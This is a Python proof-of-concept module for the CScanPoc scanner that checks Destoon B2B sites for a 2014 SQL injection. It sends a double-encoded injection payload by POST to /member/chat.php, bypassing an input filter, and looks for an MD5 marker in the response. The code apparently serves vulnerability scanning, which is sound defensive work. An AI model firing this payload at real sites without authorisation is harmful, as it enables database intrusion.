# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Destoon_0003'  # 平台漏洞编号，留空
    name = 'Destoon SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-03-18'  # 漏洞公布时间
    desc = '''
        Destoon B2B网站管理系统是一套完善的B2B（电子商务）行业门户解决方案。
        在function strip_uri($uri) { //检查了REQUEST_URI,里面有%就解码，解到最后检查敏感字符，我们要引入'，即使我们双编码过后，最终还是会被还原成',这里检查了',所以GET提交无解，但是我们POST提交的话,REQUEST_URI就不会接受任何数据，从而绕过了检查。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1408/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Destoon'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9d867218-d0ee-4cff-a9bc-17b76e9c8300'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/member/chat.php?touser=admin'
            data = "forward=aaaa%2527),(12345678901234567890123456789012,(select%2574 md5(c)),%2527test2test2%2527,4%25275"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
